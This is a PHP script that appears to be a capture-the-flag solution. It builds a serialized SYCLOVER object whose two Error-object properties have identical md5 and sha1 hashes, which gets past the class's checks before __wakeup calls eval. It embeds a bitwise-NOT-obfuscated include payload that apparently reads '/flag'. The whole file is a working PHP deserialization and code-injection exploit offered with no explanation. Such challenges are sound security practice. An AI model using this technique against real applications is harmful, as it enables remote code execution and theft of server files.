<?php

class SYCLOVER {
	public $syc;
	public $lover;
	public function __wakeup(){
		if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
		   if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->var1, $match)){
			   eval($this->syc);
		   } else {
			   die("Try Hard !!");
		   }
		   
		}
	}
}

$str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!".urldecode("%FF")."]?>";
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>
